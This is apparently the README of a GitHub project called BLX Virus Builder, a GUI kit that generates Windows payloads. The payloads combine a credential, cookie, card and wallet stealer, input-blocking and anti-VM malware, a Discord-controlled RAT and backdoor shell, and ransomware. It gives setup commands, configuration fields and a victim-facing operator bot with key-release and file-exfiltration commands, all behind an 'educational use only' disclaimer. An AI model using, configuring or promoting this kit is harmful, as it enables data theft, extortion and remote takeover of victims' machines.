<p align="center">
  <img src="Img/blxbanner.png">
</p>

# BLX - Virus Builder

> **BLX Virus Builder Tool** — Everything the builder needs is in this folder.

[![GitHub](https://img.shields.io/badge/GitHub-BenzoXdev%2FBlx--Virus--Builder-181717?style=flat-square&logo=github)](https://github.com/BenzoXdev/Blx-Virus-Builder)
[![Python](https://img.shields.io/badge/Python-3.x-3776AB?style=flat-square&logo=python&logoColor=white)](https://www.python.org/)
[![License](https://img.shields.io/badge/Usage-Educational%20Only-red?style=flat-square)]()

| Link | Description |
|------|-------------|
| **Project** | [Blx-Virus-Builder](https://github.com/BenzoXdev/Blx-Virus-Builder) |
| **Author** | [BenzoXdev](https://github.com/BenzoXdev) |

---

## ⚠️ Warning / Disclaimer

<div align="center">

**This tool is provided for educational and cybersecurity research purposes only.**

</div>

### Limitation of liability — Full disclaimer

The author, contributors and maintainers of this project **disclaim all responsibility** and **fully exempt themselves** from any legal, criminal, civil or contractual obligation relating to:

- The **use** of this software, whether lawful or unlawful;
- Any **damage** direct or indirect caused by the use of this tool;
- Any **legal proceedings**, **fines**, **sanctions** or **convictions** resulting from the use of this software;
- Any **law violation** (unauthorized access, system compromise, data theft, etc.) committed by the user;
- Any **content** or **data** exfiltrated, encrypted or modified via this tool.

**By using this software, you agree to:**

- Use it **only** in a legal context (authorized testing, pentest, academic research);
- Be **solely responsible** for your actions and their legal consequences;
- That the author **cannot under any circumstances** be held liable for your actions.

Any use of this software to attack systems without explicit authorization is **prohibited** and punishable by law. **The author disclaims all responsibility** in case of misuse.

📄 **See [DISCLAIMER.md](DISCLAIMER.md)** for the full legal notice.

---

## 📑 Table of Contents

1. [Overview](#-overview)
2. [Workflow](#-workflow)
3. [Builder Interface](#-builder-interface)
4. [Quick Install](#-quick-install)
5. [Project Structure](#-project-structure)
6. [Using the Builder](#-using-the-builder)
7. [Stealer Options](#-stealer-options)
8. [Malware Options](#-malware-options)
9. [RAT and Backdoor Config](#-rat-and-backdoor-config)
10. [Ransomware Option](#-ransomware-option)
11. [Ransomware Config in Builder](#-ransomware-config-in-builder)
12. [Decryptor (BLX_Decryptor)](#-decryptor-blx_decryptor)
13. [Discord Bot (BLX_Ransomware_Bot)](#-discord-bot-blx_ransomware_bot)
14. [Bot Configuration](#-bot-configuration)
15. [Build Decryptor as EXE](#-build-decryptor-as-exe)
16. [Build Output](#-build-output)
17. [Dependencies](#-dependencies)

---

## 🎯 Overview

**BLX Virus Builder** is a graphical tool (GUI) for creating custom payloads for security testing and cybersecurity research. It combines **Stealer** (data theft), **Malware** (disruptive actions), **RAT**, **Backdoor** and **Ransomware** modules in a single configurable build.

### Main features

| Category | Description |
|----------|-------------|
| **Stealer** | Passwords, cookies, Discord sessions, wallets, etc. |
| **Malware** | Block keyboard/mouse, popup, shutdown, anti-VM, etc. |
| **RAT** | Remote control via Discord |
| **Backdoor** | Remote shell via Discord |
| **Ransomware** | .blx encryption + decryptor + operator bot |

---

## 🔄 Workflow

Complete builder flow, from configuration to output:

![Architecture BLX Virus Builder](Img/architecture.png)

### Detailed build process

![Build process](Img/build-process.png)

| Step | Description |
|------|-------------|
| **1. Configuration** | Discord Webhook URL, options checked |
| **2. Stealer modules** | Passwords, Cookies, Discord, Wallets, etc. |
| **3. Malware modules** | Block keys, RAT, Backdoor, Ransomware |
| **4. Compilation** | PyInstaller (for .exe) or raw Python script |
| **5. Output** | Files in `1-Output/VirusBuilder/` |

---

## 🖥️ Builder Interface

Main GUI preview:

![Builder Interface](Img/builder-interface.png)

The interface provides tabs for **Stealer** and **Malware** options, a Webhook field, checkboxes for each module, and a **Build** button to generate the payload.

---

## ⚡ Quick Install

```bash
# 1. Clone the repository
git clone https://github.com/BenzoXdev/Blx-Virus-Builder.git
cd Blx-Virus-Builder

# 2. Install dependencies
pip install -r requirements.txt

# 3. Launch the builder
python Virus-Builder.py
```

**Windows:** you can use `run.bat` or `setup.bat` if provided.

---

## 📁 Project Structure

```
Virus Builder/
├── Virus-Builder.py              # Entry point: run this file
├── Config/
│   ├── __init__.py
│   ├── Config.py                 # Configuration (name, version, etc.)
│   └── Util.py                   # Utilities (banner, colors, Reset, etc.)
├── FileDetectedByAntivirus/
│   ├── __init__.py
│   ├── BuilderOptions.py         # Build blocks: CORE, STEALER, MALWARE, DISCORD
│   └── blxOP/                    # (optional)
├── Ransomware/
│   ├── BLX_Decryptor.py          # .blx decryptor (give to victim with key)
│   ├── BLX_Ransomware_Bot.py     # Discord bot: !key, !keys, !exfil, !info, !decryptor
│   ├── BLX_ransomware_bot_config.example.json
│   ├── build_decryptor_exe.bat   # Compile BLX_Decryptor to EXE
│   └── README.md                 # Ransomware quick reference
├── Img/
│   ├── BLX_icon.ico
│   ├── 7752569.ico
│   ├── architecture.png          # Workflow diagram
│   ├── build-process.png         # Build process
│   └── builder-interface.png     # Interface preview
├── 1-Output/
│   └── VirusBuilder/             # Build output + BLX_ransomware_keys.json
├── requirements.txt
├── run.bat
├── setup.bat
└── README.md
```

---

## 🛠️ Using the Builder

1. **Discord Webhook**: enter the webhook URL (required) and test if needed.
2. **Options**: check the desired modules (Stealer and/or Malware), see [Stealer Options](#-stealer-options) and [Malware Options](#-malware-options).
3. **Optional configs**: for RAT, Backdoor or Ransomware, check the option then confirm the config window that opens.
4. **Build**:
   - **File name**: name for the future .py or .exe.
   - **Type**: **Python File** (.py) or **Exe File** (.exe).
   - **Icon**: choose a .ico (especially for Exe File).
5. Click **Build**; files are created in `1-Output/VirusBuilder/`.

---

## 📦 Stealer Options

| Option | Description |
|--------|-------------|
| System Info | System info (OS, CPU, RAM, etc.) |
| Wallets Session Files | Crypto wallet session files |
| Games Session Files | Game launcher session files |
| Telegram Session Files | Telegram session files |
| Roblox Accounts | Roblox accounts |
| Discord Accounts | Discord accounts (tokens, etc.) |
| Discord Injection | Injection into Discord client |
| Passwords | Browser passwords |
| Cookies | Browser cookies |
| Browsing History | Browsing history |
| Download History | Download history |
| Cards | Saved credit cards |
| Extentions | Browser extensions |
| Interesting Files | Files deemed interesting |
| Webcam | Webcam capture |
| Screenshot | Screenshot |

---

## 🦠 Malware Options

| Option | Description |
|--------|-------------|
| Block Key | Block keyboard |
| Block Mouse | Block mouse |
| Block Task Manager | Block Task Manager |
| Block AV Website | Block access to antivirus sites |
| Shutdown | Shut down the machine |
| Message Popup | Show a window (title, message, type: info/warning/error/question) |
| Spam Open Program | Open programs in a loop |
| Spam Create File | Create files in a loop |
| Anti VM & Debug | VM / debug detection (do not run in certain environments) |
| Launch at Startup | Launch at Windows startup |
| Restart Every 5min | Restart payload every 5 minutes |
| RAT | Discord RAT (remote control) — config: token, server ID, persistence, admin required |
| Backdoor (Shell) | Discord backdoor / shell — config: token, server ID, persistence, admin required |
| Ransomware | .blx encryption + decryptor + operator bot — see [Ransomware Option](#-ransomware-option) |

---

## 🔧 RAT and Backdoor Config

- **RAT**: check « RAT » then open the config (by clicking the box). Enter **Bot Token**, **Server ID**, optionally **Persistence** and **Admin required**.
- **Backdoor**: check « Backdoor (Shell) » then open the config. Enter **Bot Token**, **Server ID**, **Persistence**, **Admin required**.

---

## 🔐 Ransomware Option

If the **Ransomware** option is enabled in the build:

- **Keys**: stored in `1-Output/VirusBuilder/BLX_ransomware_keys.json` and copied to `Ransomware/BLX_ransomware_keys.json`.
- **Decryptor**: the builder automatically compiles **BLX_Decryptor.exe** and embeds it in the payload (placed on victim’s Desktop). Manual compilation: [Build Decryptor as EXE](#-build-decryptor-as-exe).
- **Operator bot**: run `python Ransomware\BLX_Ransomware_Bot.py` (from project root). The bot reads keys from `Ransomware\BLX_ransomware_keys.json` or `1-Output\VirusBuilder\BLX_ransomware_keys.json`.
- **Bot config**: copy `Ransomware\BLX_ransomware_bot_config.example.json` to `Ransomware\BLX_ransomware_bot_config.json` and fill at least **token** and **server_id**. Details: [Bot Configuration](#-bot-configuration).

---

## ⚙️ Ransomware Config in Builder

By checking **Ransomware** and opening the config window (click on the box), you can set:

| Field | Description |
|-------|-------------|
| **Open Ransomware folder** | Button: opens the project `Ransomware` folder. |
| **Bot Token** | Discord bot token (for !key, etc. commands). |
| **Server ID** | Discord server ID. |
| **Webhook URL** | Webhook for victim reports (can be the same as main webhook). |
| **Exfil Bot Token** | Second bot token (listens for victim !exfil). Optional. |
| **Exfil Channel ID** | Channel ID where the bot sends !exfil commands (payload listens on this channel). Optional. |
| **Excluded extensions** | Non-encrypted extensions, comma-separated. E.g.: `.exe,.dll,.sys` (empty = no extension exclusion). |
| **Excluded paths** | Paths under which files are not encrypted, comma-separated. E.g.: `C:\Users\Public` (empty = none). |
| **README text** | Custom message written in `README_BLX.txt` on victim’s Desktop (empty = default message). |
| **Delay before encryption** | Delay in seconds before starting encryption (0 = immediate, max 86400). |

---

## 📄 Decryptor (BLX_Decryptor)

**File:** `Ransomware/BLX_Decryptor.py`  
To be given to the victim with the **decryption key** (base64, 32 bytes) provided by the bot: `!key <victim_id>`.

### GUI (default)

1. Paste the **key** (base64) received.
2. Choose the **folder** to decrypt (default: user folder).
3. **Count .blx**: counts `.blx` files in the folder (background calculation).
4. **Decrypt .blx files**: starts decryption.
5. **Progress**: progress bar and current file.
6. **Stop**: interrupts decryption.
7. At the end: **report** (Desktop or target folder), **key stored** (AppData or next to script), **cleanup** (persistence, README_BLX.txt) and **auto-deletion** of decryptor on success.

Features: progress, Stop, .blx count, key storage, detailed report (success/failures).

### Command line (CLI)

```bash
python Ransomware/BLX_Decryptor.py --cli
```

Enter the key (base64) and folder to decrypt (Enter = default user folder).

---

## 🤖 Discord Bot (BLX_Ransomware_Bot)

**File:** `Ransomware/BLX_Ransomware_Bot.py`

### Launch

From the **project root** (Virus Builder):

```bash
python Ransomware\BLX_Ransomware_Bot.py
```

The bot reads config from `Ransomware\BLX_ransomware_bot_config.json` and keys from `Ransomware\BLX_ransomware_keys.json` or `1-Output\VirusBuilder\BLX_ransomware_keys.json`.

### Commands

| Command | Description |
|---------|-------------|
| `!key <victim_id>` | Sends the decryption key by **DM** to the command author. |
| `!key <victim_id> <channel_id>` | Sends the key in the specified **channel** (instead of DM). |
| `!keys` | Lists Victim IDs in the key file. |
| `!exfil <victim_id> <file_path>` | Sends an exfiltration command to the victim’s payload (if exfil configured). E.g.: `!exfil ABC123 C:\Users\victim\Desktop\file.txt` (max 8 MB, under `C:\Users`). |
| `!info` | Shows bot status (key file, victim count, exfil, roles). |
| `!info <victim_id>` | Indicates if a key exists for this Victim ID. |
| `!decryptor` | Reminder of instructions for the victim (use of BLX_Decryptor.exe). |
| `!help` | Shows command help. |

### Role restriction

If **allowed_role_ids** is set in the config, only users with **at least one** of these roles can use the commands. Otherwise, everyone can use them.

### Command logging

If **log_file** is set in the config, each command is logged to that file (date, command, author, channel).

---

## 📋 Bot Configuration

1. Copy **`Ransomware/BLX_ransomware_bot_config.example.json`** to **`Ransomware/BLX_ransomware_bot_config.json`**.
2. Fill at least:
   - **token**: Discord bot token.
   - **server_id**: Discord server ID.
3. Optional:
   - **exfil_channel_id**: Channel ID where the bot sends `!exfil` commands (victim payload listens on this channel).
   - **allowed_role_ids**: List of role IDs allowed to use commands (empty = all).
   - **log_file**: Path to a file for logging commands (empty = no file logging).

Full example:

```json
{
  "token": "YOUR_BOT_TOKEN",
  "server_id": "SERVER_ID",
  "exfil_channel_id": "EXFIL_CHANNEL_ID",
  "allowed_role_ids": ["ROLE_ID_1", "ROLE_ID_2"],
  "log_file": "Ransomware/command_log.txt"
}
```

---

## 📦 Build Decryptor as EXE

To compile **BLX_Decryptor.py** to **BLX_Decryptor.exe** (single file, no console):

1. Open a terminal in the **Ransomware** folder:
   ```bash
   cd Ransomware
   ```
2. Run:
   ```bash
   build_decryptor_exe.bat
   ```
   or manually:
   ```bash
   python -m PyInstaller --onefile --windowed --name BLX_Decryptor --icon "..\Img\7752569.ico" --clean BLX_Decryptor.py
   ```
3. The executable is in **`Ransomware\dist\BLX_Decryptor.exe`**.

The Virus Builder can also automatically compile and embed this decryptor in the payload when building with the Ransomware option enabled (placed on victim’s Desktop).

---

## 📂 Build Output

- **Generated files (.py or .exe)**: **`1-Output/VirusBuilder/`**
- **Ransomware keys** (if option enabled):
  - **`1-Output/VirusBuilder/BLX_ransomware_keys.json`**
  - Copy to **`Ransomware/BLX_ransomware_keys.json`** for the bot.

---

## 📚 Dependencies

See **`requirements.txt`**. Main ones:

| Category | Packages |
|----------|----------|
| **Builder (GUI)** | colorama, cryptography, customtkinter, requests, discord.py, pyinstaller |
| **Stealer / browsers** | browser-cookie3, pycryptodome |
| **System / hardware** | psutil, GPUtil, screeninfo |
| **Webcam / capture** | opencv-python, Pillow, mss |
| **Keyboard / mouse** | keyboard, pyautogui, pynput |
| **Audio** | sounddevice, scipy |
| **RAT / misc** | comtypes, pycaw, numpy |
| **Windows** | pywin32 |
| **Optional** | auto-py-to-exe, bcrypt, beautifulsoup4, selenium, etc. |

```bash
pip install -r requirements.txt
```

---

<p align="center">
  <strong>BLX Virus Builder</strong> — Educational use only
</p>
<p align="center">
  <a href="https://github.com/BenzoXdev/Blx-Virus-Builder">GitHub</a> •
  <a href="https://github.com/BenzoXdev">BenzoXdev</a>
</p>
